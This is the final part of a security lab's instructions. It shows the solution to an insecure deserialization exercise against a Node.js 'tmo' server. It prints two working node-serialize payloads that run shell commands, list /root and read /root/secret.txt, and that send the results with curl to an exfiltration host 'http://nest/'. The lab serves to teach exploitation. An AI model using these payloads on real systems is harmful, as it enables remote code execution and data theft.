# Lab instructions (3/3)

## Solution 2

Using the following payload, we were able to see which files could be found in
the `root` folder:

```js
{"id":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"ls /root > /tmp/output; curl --data-binary '@/tmp/output' http://nest/\")}()"}
```

This would have alerted us of the file `/root/secret.txt`. Using the same
technique, we are able to view the contents of the file:

```js
{"id":"_$$ND_FUNC$$_function(){require(\"child_process\").exec(\"curl --data-binary '@/root/secret.txt' http://nest/\")}()"}
```

Congratulations! By exploiting a insecure deserialization vulnerability in the
`tmo` server, you were able to execute arbitrary commands on their server.
Furthermore, by using an exfiltration server you were able to exfiltrate data
from their server.

Note that this lab does not look at exactly what causes the insecure
deserialization vulnerability, or how this could have been prevented.
